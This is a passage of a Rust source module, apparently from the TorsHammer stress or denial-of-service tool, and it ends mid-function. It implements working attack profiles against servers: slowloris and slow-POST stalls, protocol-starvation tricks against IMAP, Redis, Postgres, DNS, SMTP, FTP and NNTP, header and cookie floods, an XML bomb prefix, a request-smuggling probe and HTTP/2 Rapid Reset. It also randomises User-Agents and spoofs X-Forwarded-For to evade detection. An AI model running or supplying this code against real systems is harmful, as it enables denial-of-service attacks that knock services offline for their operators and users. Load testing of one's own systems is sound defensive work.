//! Attack profiles: each profile opens one connection and slowly consumes it
//! so a vulnerable server ties up a worker waiting on an incomplete request.
//!
//! This module mirrors `src/torshammer/profiles.py` profile for profile so the
//! two backends produce equivalent slow-request traffic:
//!
//! * `slow-post`        - headers with a big `Content-Length`, body dripped one
//!   byte at a time (classic Tor's Hammer).
//! * `slow-post-headers` - request line and headers leaked one line at a time,
//!   then the body is dripped byte by byte.
//! * `slow-headers`     - never finish the request headers (slowloris).
//! * `slow-read`        - full request, then read the response in tiny chunks
//!   with pauses (slow-read / slow-bytes).
//! * `chunked`          - `Transfer-Encoding: chunked` body dripped in small
//!   chunks without the terminating 0-chunk.
//! * `multipart-slow-upload` - `multipart/form-data` POST, MIME-part content
//!   dribbled slowly, closing boundary never emitted.
//! * `expect-continue-abuse` - `Expect: 100-continue` headers, then the body
//!   stalls after the interim server response.
//!
//! Protocol-starvation profiles (announce a length the server blocks reading,
//! then never complete it): `imap-slow-literal`, `redis-resp-slow`,
//! `postgres-startup-slow`, `dns-tcp-slow`, `nntp-slow-post`, plus `idle-hold`
//! which opens a connection and sends zero bytes.
//!
//! HTTP-parser / framing-abuse profiles (nearly complete the request, then abuse
//! how the server parses it): `slow-xml` (unclosed XML/`DOCTYPE` prolog),
//! `slow-form-parse` (endless urlencoded `key=value&` pairs), `header-count-flood`
//! (~2000 tiny headers, then the request is completed), `websocket-slow-frame`
//! (post-handshake frame whose declared length never fills) and
//! `req-smuggling-probe` (ambiguous `Content-Length` + `Transfer-Encoding`).
//!
//! HTTP/2 framing / HPACK-abuse profiles (real `h2` frames built in `h2.rs`, no
//! crates): `h2-rapid-reset` (open many streams then `RST_STREAM` each instantly,
//! CVE-2023-44487 class), `h2-slow-streams` (half-open streams dribbled a byte of
//! `DATA` forever), `h2-continuation-flood` (unbounded `CONTINUATION` frames that
//! never set `END_HEADERS`) and `h2-hpack-drip` (one HPACK block fed a single
//! octet per frame, the HTTP/2 analogue of a slowloris header drip).
//!
//! TLS-handshake starvation profiles (real TLS records built in `tls.rs`, no
//! crates): `tls-slow-hello` (a handshake record declaring a length far larger
//! than the bytes ever delivered, pinning the server's reassembly buffer) and
//! `tls-renego-hold` (repeated fresh starved ClientHello records churning
//! (re)handshake initiation on a single connection).

use super::h2;
use super::rng::Rng;
use super::signals;
use super::stats::Stats;
use super::tls;
use super::EngineConfig;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

const ACCEPTS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
];

/// Built-in User-Agent pool (Python loads these from `--user-agents`; the Rust
/// engine always randomizes from this built-in list).
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (compatible; TorsHammer/2.0)",
];

const ALNUM_BYTES: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

/// Signature shared by every TCP attack profile handler.
pub type Handler = fn(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool;

/// Single source of truth for the Rust engine's TCP profiles: name + handler.
///
/// Dispatch, `--help`, argument validation and the cross-backend parity tests
/// all derive from this one table, so adding a mode is exactly "write the fn +
/// add one line here". The `udp` mode is handled by the engine (`udp.rs`), not
/// a stream handler, so it is appended separately by [`mode_names`].
pub const TCP_MODES: &[(&str, Handler)] = &[
    ("slow-post", slow_post),
    ("slow-post-headers", slow_post_headers),
    ("slow-headers", slow_headers),
    ("slow-read", slow_read),
    ("chunked", chunked),
    ("multipart-slow-upload", multipart_slow_upload),
    ("expect-continue-abuse", expect_continue_abuse),
    ("websocket-slow-upgrade", websocket_slow_upgrade),
    ("http-pipelining", http_pipelining),
    ("range-abuse", range_abuse),
    ("cookie-bomb", cookie_bomb),
    ("jsonrpc-slow", jsonrpc_slow),
    ("smtp-slow-envelope", smtp_slow_envelope),
    ("ftp-slow-command", ftp_slow_command),
    ("imap-slow-literal", imap_slow_literal),
    ("redis-resp-slow", redis_resp_slow),
    ("postgres-startup-slow", postgres_startup_slow),
    ("dns-tcp-slow", dns_tcp_slow),
    ("nntp-slow-post", nntp_slow_post),
    ("idle-hold", idle_hold),
    ("slow-xml", slow_xml),
    ("slow-form-parse", slow_form_parse),
    ("header-count-flood", header_count_flood),
    ("websocket-slow-frame", websocket_slow_frame),
    ("req-smuggling-probe", req_smuggling_probe),
    ("h2-rapid-reset", h2_rapid_reset),
    ("h2-slow-streams", h2_slow_streams),
    ("h2-continuation-flood", h2_continuation_flood),
    ("h2-hpack-drip", h2_hpack_drip),
    ("tls-slow-hello", tls_slow_hello),
    ("tls-renego-hold", tls_renego_hold),
];

/// Every mode name the Rust engine accepts (the TCP profiles plus `udp`).
pub fn mode_names() -> Vec<&'static str> {
    let mut names: Vec<&'static str> = TCP_MODES.iter().map(|(name, _)| *name).collect();
    names.push("udp");
    names
}

/// Run the profile for the current mode on an established connection.
///
/// Returns `true` if the profile completed naturally, `false` if the run was
/// interrupted by the stop flag or the mode has no stream handler.
pub fn run_profile(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    for (name, handler) in TCP_MODES {
        if *name == config.mode {
            return handler(config, stream, stats, running, rng);
        }
    }
    false
}

fn should_stop(running: &AtomicBool) -> bool {
    !running.load(Ordering::Relaxed) || signals::shutdown_requested()
}

fn write_full(stream: &mut TcpStream, data: &[u8], stats: &Stats) -> io::Result<()> {
    stream.write_all(data)?;
    stats.add_sent(data.len() as u64);
    Ok(())
}

/// Best-effort non-blocking read of any pending response bytes.
///
/// Pipelined/range profiles keep writing without waiting for replies; if the
/// target's responses are never drained the TCP receive window closes and
/// `write_all` eventually wedges. A near-zero read timeout makes `read` return
/// immediately when nothing is buffered, so this never blocks the hot loop.
fn drain_responses(stream: &mut TcpStream, stats: &Stats) -> usize {
    let _ = stream.set_read_timeout(Some(Duration::from_micros(1)));
    let mut buf = [0u8; 16 * 1024];
    let mut drained = 0usize;
    loop {
        match stream.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                stats.record_response_bytes(&buf[..n]);
                drained += n;
            }
            Err(ref e)
                if e.kind() == io::ErrorKind::WouldBlock || e.kind() == io::ErrorKind::TimedOut =>
            {
                break
            }
            Err(_) => break,
        }
    }
    let _ = stream.set_read_timeout(None);
    drained
}

fn halt(rng: &mut Rng, config: &EngineConfig, running: &AtomicBool) {
    // Zero delay means "no waiting at all": skip both the PRNG draw and the
    // (blocking) sleep slices. The attack loop itself is the throttle here;
    // without this fast path, unit tests with delay_min = delay_max = 0.0
    // would still burn real seconds inside sleep_slices.
    if config.delay_min <= 0.0 && config.delay_max <= 0.0 {
        return;
    }
    let delay = rng.range_f64(config.delay_min, config.delay_max);
    super::sleep_slices(running, delay);
}

fn request_path(config: &EngineConfig, rng: &mut Rng) -> String {
    if !config.randomize_path {
        return config.path.clone();
    }
    let separator = if config.path.contains('?') { "&" } else { "?" };
    format!("{}{}{}", config.path, separator, rng.alnum(9))
}

fn base_headers(config: &EngineConfig, rng: &mut Rng) -> Vec<String> {
    let mut headers = vec![
        format!("Host: {}", config.header_host),
        format!("User-Agent: {}", rng.choice(USER_AGENTS)),
        format!("Accept: {}", rng.choice(ACCEPTS)),
        "Accept-Language: en-US,en;q=0.9".to_string(),
        "Accept-Encoding: gzip, deflate".to_string(),
        "Connection: keep-alive".to_string(),
        "Keep-Alive: 900".to_string(),
        "X-Requested-With: XMLHttpRequest".to_string(),
    ];
    if rng.chance(0.5) {
        headers.push(format!("Referer: https://{}/", config.header_host));
    }
    if rng.chance(0.35) {
        headers.push("Cache-Control: no-cache".to_string());
    }
    if rng.chance(0.25) {
        headers.push("DNT: 1".to_string());
    }
    if rng.chance(0.25) {
        headers.push("TE: trailers, deflate".to_string());
    }
    if rng.chance(0.5) {
        headers.push(format!("X-Forwarded-For: {}", rng.random_ip()));
    }
    if rng.chance(0.4) {
        headers.push(format!("X-Trace-Id: {}", rng.hex(6)));
    }
    // Custom headers override defaults (case-insensitive name match).
    for (name, value) in &config.custom_headers {
        let lower = name.to_ascii_lowercase();
        headers.retain(|line| {
            let existing = line.split(':').next().unwrap_or("").trim();
            !existing.eq_ignore_ascii_case(&lower)
        });
        headers.push(format!("{name}: {value}"));
    }
    headers
}

fn dribble(rng: &mut Rng) -> u8 {
    ALNUM_BYTES[rng.range_usize(0, ALNUM_BYTES.len() - 1)]
}

fn websocket_slow_upgrade(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let mut headers = base_headers(config, rng);

    // Add WebSocket-specific headers
    headers.push("Upgrade: websocket".to_string());
    headers.push("Connection: Upgrade".to_string());

    // Generate WebSocket key (random base64)
    let ws_key_bytes: Vec<u8> = (0..16).map(|_| rng.range_u8(0, 254)).collect();
    let ws_key = STANDARD.encode(&ws_key_bytes);
    headers.push(format!("Sec-WebSocket-Key: {ws_key}"));
    headers.push("Sec-WebSocket-Version: 13".to_string());

    if rng.chance(0.5) {
        headers.push("Sec-WebSocket-Protocol: chat".to_string());
    }

    // Send request line (the HTTP/1.1 version token is mandatory: without it
    // real servers reject the request with 400/505 instead of holding it open).
    let request = format!("{} {} HTTP/1.1\r\n", method, request_path(config, rng));
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    // Slowly send headers one by one
    for header in headers {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{}\r\n", header).as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }

    // Never send the terminating blank line to keep upgrade incomplete
    while !should_stop(running) {
        // Continue sending random X-headers to keep connection alive
        let key = format!("X-{}", rng.hex(6));
        let value = rng.hex(8);
        if write_full(stream, format!("{key}: {value}\r\n").as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn http_pipelining(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let headers = base_headers(config, rng);
    let request = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );

    // Keep the pipeline continuously loaded until the run is stopped; each
    // round drains any pending responses so the socket buffer never wedges
    // (parity with the Python `HttpPipelining` profile).
    while !should_stop(running) {
        let sent_at = Instant::now();
        if write_full(stream, request.as_bytes(), stats).is_err() {
            break;
        }
        if drain_responses(stream, stats) > 0 {
            stats.record_response_latency_micros(sent_at.elapsed().as_micros() as u64);
        }
        // Small delay between requests to keep connection alive
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn range_abuse(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());

    // Keep issuing byte-range requests until stopped to exhaust the target's
    // file-handle / worker limits (parity with the Python `RangeHeaderAbuse`).
    while !should_stop(running) {
        let mut headers = base_headers(config, rng);

        // Add random Range header
        let start = rng.range_usize(0, 1_000_000);
        let end = start + rng.range_usize(100, 10_000);
        headers.push(format!("Range: bytes={start}-{end}"));

        let request = format!(
            "{} {} HTTP/1.1\r\n{}\r\n\r\n",
            method,
            request_path(config, rng),
            headers.join("\r\n")
        );

        let sent_at = Instant::now();
        if write_full(stream, request.as_bytes(), stats).is_err() {
            break;
        }
        if drain_responses(stream, stats) > 0 {
            stats.record_response_latency_micros(sent_at.elapsed().as_micros() as u64);
        }
        // Small delay between requests
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn cookie_bomb(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let mut headers = base_headers(config, rng);

    // Generate large cookie value (10KB for testing, can be larger in production)
    let cookie_size = 10 * 1024; // 10KB (reduced from 1MB for test performance)
    let cookie_value = rng.alnum(cookie_size);
    let cookie_name = "bomb_cookie";

    // Replace existing cookie if present, or add new one
    headers.retain(|h| !h.to_ascii_lowercase().starts_with("cookie:"));
    headers.push(format!("Cookie: {cookie_name}={cookie_value}"));

    let request = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );

    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    // Keep connection alive with periodic keep-alive headers
    while !should_stop(running) {
        halt(rng, config, running);
        // Send small keep-alive data to maintain connection
        if rng.chance(0.1) {
            // 10% chance to send keep-alive
            if write_full(stream, b"X-Keep-Alive: 1\r\n", stats).is_err() {
                break;
            }
        }
    }

    !should_stop(running)
}

fn jsonrpc_slow(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/json".to_string());

    // Generate JSON-RPC payload (partial, never completed)
    let json_payload = r#"{"jsonrpc":"2.0","method":"slow_method","params":["#;
    let json_length = json_payload.len();

    headers.push(format!("Content-Length: {}", json_length + 1000)); // Claim larger size

    let request = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );

    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    // Slowly send JSON payload character by character
    let mut sent = 0;
    while !should_stop(running) && sent < json_payload.len() {
        let byte = json_payload.as_bytes()[sent];
        if write_full(stream, &[byte], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }

    // Continue sending partial JSON data without completion
    while !should_stop(running) {
        if write_full(stream, br#""param","#, stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn smtp_slow_envelope(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Slowly send SMTP envelope commands
    let smtp_commands = vec![
        format!("EHLO {}", config.header_host),
        "MAIL FROM: <slow-test@example.com>".to_string(),
        "RCPT TO: <recipient@example.com>".to_string(),
    ];

    for cmd in smtp_commands {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{}\r\n", cmd).as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }

    // Never send DATA command to keep envelope incomplete
    while !should_stop(running) {
        // Continue sending incomplete RCPT TO commands
        if write_full(stream, b"RCPT TO: <another@example.com>\r\n", stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn ftp_slow_command(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Slowly send FTP commands
    let ftp_commands = vec![
        "USER anonymous".to_string(),
        "PASS test@example.com".to_string(),
        "PASV".to_string(),
    ];

    for cmd in ftp_commands {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{}\r\n", cmd).as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }

    // Never complete data transfer
    while !should_stop(running) {
        // Continue sending PASV commands
        if write_full(stream, b"PASV\r\n", stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

/// Send a protocol framing `announce` then drip `count` body bytes slowly.
///
/// Shared by the protocol-starvation profiles (IMAP literal, Redis bulk
/// string, Postgres startup, DNS-over-TCP): the server parses a declared length
/// then blocks waiting for exactly that many octets. We announce an oversized
/// length, emit only a few bytes, and never complete the element, pinning the
/// server's request handler. Returns `false` if stopped or a write failed; the
/// caller holds the socket open once it returns `true` (mirrors Python's
/// `_announce_then_dribble`).
fn announce_then_dribble(
    stream: &mut TcpStream,
    stats: &Stats,
    config: &EngineConfig,
    running: &AtomicBool,
    rng: &mut Rng,
    announce: &[u8],
    count: usize,
) -> bool {
    if write_full(stream, announce, stats).is_err() {
        return false;
    }
    let mut sent = 0;
    while !should_stop(running) && sent < count {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            return false;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

/// Endless slow dribble of single bytes, used once an element's oversized
/// length has been announced (keeps the pinned server waiting for the rest).
fn dribble_forever(
    stream: &mut TcpStream,
    stats: &Stats,
    config: &EngineConfig,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    while !should_stop(running) {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn imap_slow_literal(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // IMAP literals: `<tag> APPEND INBOX {N}` makes the server reply `+ ` and
    // block until it has read exactly N octets. Announce a large literal, drip
    // a few bytes, then never close it - the mailbox worker stays pinned.
    let tag = rng.alnum(4).to_uppercase();
    let length = rng.range_usize(config.base_post_length, config.base_post_length * 4);
    let announce = format!("{tag} APPEND INBOX {{{length}}}\r\n");
    if !announce_then_dribble(stream, stats, config, running, rng, announce.as_bytes(), 16) {
        return false;
    }
    dribble_forever(stream, stats, config, running, rng)
}

fn redis_resp_slow(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // RESP bulk strings `$<len>\r\n` make Redis size a read handler and wait
    // for exactly len bytes plus a trailing CRLF. Declare a huge bulk argument
    // inside a one-element multibulk command, emit a few bytes, then stall.
    let length = rng.range_usize(config.base_post_length, config.base_post_length * 4);
    let announce = format!("*1\r\n${length}\r\n");
    if !announce_then_dribble(stream, stats, config, running, rng, announce.as_bytes(), 8) {
        return false;
    }
    dribble_forever(stream, stats, config, running, rng)
}

fn postgres_startup_slow(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // A Postgres frontend StartupMessage is Int32 length (counting itself) +
    // Int32 protocol version (196608 == 3.0) + NUL-separated key/value pairs +
    // a final NUL. Claim a length larger than we ever send and omit the
    // terminator: the backend blocks in secure_read for the packet.
    let total = (8 + config.base_post_length) as u32;
    let mut announce: Vec<u8> = Vec::new();
    announce.extend_from_slice(&total.to_be_bytes());
    announce.extend_from_slice(&196608u32.to_be_bytes());
    announce.extend_from_slice(b"user=slowprobe\0database=postgres\0");
    if !announce_then_dribble(stream, stats, config, running, rng, &announce, 8) {
        return false;
    }
    dribble_forever(stream, stats, config, running, rng)
}

fn dns_tcp_slow(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // DNS-over-TCP prefixes every message with a 2-byte big-endian length.
    // Announce a large query, emit the 12-byte header, then never complete it,
    // so the resolver's TCP handler blocks waiting for the declared octets.
    let declared = config.base_post_length as u16;
    let mut announce: Vec<u8> = Vec::new();
    announce.extend_from_slice(&declared.to_be_bytes());
    // Partial query header: ID, flags=RD, QDCOUNT=1, AN/NS/AR=0.
    for word in [0xAABBu16, 0x0100, 1, 0, 0, 0] {
        announce.extend_from_slice(&word.to_be_bytes());
    }
    if !announce_then_dribble(stream, stats, config, running, rng, &announce, 8) {
        return false;
    }
    dribble_forever(stream, stats, config, running, rng)
}

fn nntp_slow_post(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // NNTP POST: after `POST\r\n` the server replies 340 and reads an article
    // terminated by a line containing only a single `.`. Send POST, drip header
    // lines slowly, and never emit the terminating dot-line, so the reader
    // process stays parked mid-transfer.
    if !announce_then_dribble(stream, stats, config, running, rng, b"POST\r\n", 8) {
        return false;
    }
    while !should_stop(running) {
        let line = format!("X-{}: {}\r\n", rng.alnum(6), rng.alnum(12));
        if write_full(stream, line.as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn idle_hold(
    config: &EngineConfig,
    _stream: &mut TcpStream,
    _stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Zero-byte idle: open the connection and send NOTHING, holding the socket
    // until stopped. Exhausts servers that cap concurrent connections or idle
    // worker slots (or accept-before-request pools) with no request bytes to
    // fingerprint or rate-limit on.
    while !should_stop(running) {
        if config.delay_min <= 0.0 && config.delay_max <= 0.0 {
            // No configured pause: sleep in bounded slices so we hold the slot
            // without busy-spinning a core, still waking promptly on stop.
            super::sleep_slices(running, 0.1);
        } else {
            halt(rng, config, running);
        }
    }
    !should_stop(running)
}

/// Drop headers that would clash with a profile's own request framing.
fn strip_framing(headers: Vec<String>) -> Vec<String> {
    headers
        .into_iter()
        .filter(|h| {
            let name = h
                .split(':')
                .next()
                .unwrap_or("")
                .trim()
                .to_ascii_lowercase();
            !matches!(
                name.as_str(),
                "content-length" | "transfer-encoding" | "expect" | "te"
            )
        })
        .collect()
}

fn slow_xml(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Feed the target's XML parser a billion-laughs / XXE-shaped document
    // prefix with an oversized Content-Length, then dribble body bytes so the
    // parser keeps buffering a document that never terminates.
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = strip_framing(base_headers(config, rng));
    let length = rng.range_usize(config.base_post_length * 4, config.base_post_length * 8);
    headers.push("Content-Type: application/xml".to_string());
    headers.push(format!("Content-Length: {length}"));
    let request = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    if write_full(
        stream,
        b"<?xml version=\"1.0\"?>\n<!DOCTYPE bomb [ <!ENTITY a \"",
        stats,
    )
    .is_err()
    {
        return false;
    }
    dribble_forever(stream, stats, config, running, rng)
}

fn slow_form_parse(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Announce a huge urlencoded body and emit endless `key=value&` pairs, so
    // the framework keeps split-and-decoding into a Content-Length-sized buffer
    // that never fills.
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = strip_framing(base_headers(config, rng));
    let length = rng.range_usize(config.base_post_length * 8, config.base_post_length * 16);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let request = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    while !should_stop(running) {
        let field = format!("{}={}&", rng.alnum(6), rng.alnum(16));
        if write_full(stream, field.as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}

#[allow(clippy::manual_is_multiple_of)] // keep `% N == 0` for rustc-1.75 build compat
fn header_count_flood(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Many servers cap header *size* but not header *count*. Emit thousands of
    // tiny headers and then COMPLETE the request (a different failure mode from
    // slowloris, which never finishes headers).
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    if write_full(
        stream,
        format!("{} {} HTTP/1.1\r\n", method, request_path(config, rng)).as_bytes(),
        stats,
    )
    .is_err()
    {
        return false;
    }
    if write_full(
        stream,
        format!("Host: {}\r\n", config.header_host).as_bytes(),
        stats,
    )
    .is_err()
    {
        return false;
    }
    let mut n = 0usize;
    while !should_stop(running) && n < 2000 {
        let line = format!("X-{}: {}\r\n", rng.alnum(6), rng.alnum(4));
        if write_full(stream, line.as_bytes(), stats).is_err() {
            break;
        }
        n += 1;
        if n % 64 == 0 {
            halt(rng, config, running);
        }
    }
    if should_stop(running) {
        return false;
    }
    if write_full(stream, b"\r\n", stats).is_err() {
        return false;
    }
    while !should_stop(running) {
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn websocket_slow_frame(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Finish the WebSocket upgrade request (unlike websocket-slow-upgrade), then
    // stream a frame whose declared masked payload length is never satisfied -
    // exercising post-handshake frame readers rather than the HTTP header parser.
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let mut headers = base_headers(config, rng);
    headers.push("Upgrade: websocket".to_string());
    headers.push("Connection: Upgrade".to_string());
    let ws_key_bytes: Vec<u8> = (0..16).map(|_| rng.range_u8(0, 254)).collect();
    let ws_key = STANDARD.encode(&ws_key_bytes);
    headers.push(format!("Sec-WebSocket-Key: {ws_key}"));
    headers.push("Sec-WebSocket-Version: 13".to_string());
    let request = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    let declared: u16 = 4096;
    let mut frame: Vec<u8> = vec![0x81, 0xFF];
    frame.extend_from_slice(&declared.to_be_bytes());
    for _ in 0..4 {
        frame.push(rng.range_u8(0, 255));
    }
    if write_full(stream, &frame, stats).is_err() {
        return false;
    }
    dribble_forever(stream, stats, config, running, rng)
}

fn req_smuggling_probe(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // CL.TE request-smuggling probe (authorized testing only): present BOTH a
    // Content-Length and Transfer-Encoding: chunked so a front-end/back-end that
    // disagree on framing desynchronize. Sends the ambiguous request once, then
    // holds the socket so the differential handling is observable.
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = strip_framing(base_headers(config, rng));
    headers.push("Content-Length: 6".to_string());
    headers.push("Transfer-Encoding: chunked".to_string());
    let mut payload = format!(
        "{} {} HTTP/1.1\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    )
    .into_bytes();
    payload.extend_from_slice(b"0\r\n\r\nGET /smuggled HTTP/1.1\r\n\r\n");
    if write_full(stream, &payload, stats).is_err() {
        return false;
    }
    while !should_stop(running) {
        halt(rng, config, running);
    }
    !should_stop(running)
}

/// The fixed HTTP/2 connection preamble shared by every Tier-3 profile:
/// client magic octets + an empty SETTINGS + a SETTINGS ACK.
fn h2_preamble() -> Vec<u8> {
    let settings = h2::settings();
    let ack = h2::settings_ack();
    let mut out = Vec::with_capacity(h2::PREFACE.len() + settings.len() + ack.len());
    out.extend_from_slice(h2::PREFACE);
    out.extend_from_slice(&settings);
    out.extend_from_slice(&ack);
    out
}

fn h2_rapid_reset(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // HTTP/2 Rapid Reset (CVE-2023-44487 class): on one connection, open a
    // continuous run of requests and RST_STREAM each immediately after sending
    // its (complete) HEADERS. The server allocates then tears down per-stream
    // state far faster than it can serve, exhausting workers at near-zero
    // bandwidth. Frames/headers are hand-built in h2.rs (no crates).
    if write_full(stream, &h2_preamble(), stats).is_err() {
        return false;
    }
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let authority = config.header_host.clone();
    let ua = *rng.choice(USER_AGENTS);
    let mut stream_id: u32 = 1;
    while !should_stop(running) {
        let mut burst: Vec<u8> = Vec::new();
        for _ in 0..512 {
            let path = request_path(config, rng);
            let block =
                h2::request_block(&method, &path, &authority, "http", &[("user-agent", ua)]);
            burst.extend_from_slice(&h2::frame(
                stream_id,
                h2::HEADERS,
                h2::END_HEADERS | h2::END_STREAM,
                &block,
            ));
            burst.extend_from_slice(&h2::rst_stream(stream_id, h2::NO_ERROR));
            stream_id = stream_id.wrapping_add(2);
            if stream_id > 0x7FFF_FFF0 {
                stream_id = 1;
            }
        }
        if write_full(stream, &burst, stats).is_err() {
            break;
        }
        drain_responses(stream, stats);
    }
    !should_stop(running)
}

fn h2_slow_streams(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Open many streams whose HEADERS omit END_STREAM (so each awaits a request
    // body), then trickle a byte of DATA onto them forever without ever
    // finishing a stream. Every half-open stream pins per-stream bookkeeping /
    // flow-control state on the target.
    if write_full(stream, &h2_preamble(), stats).is_err() {
        return false;
    }
    let authority = config.header_host.clone();
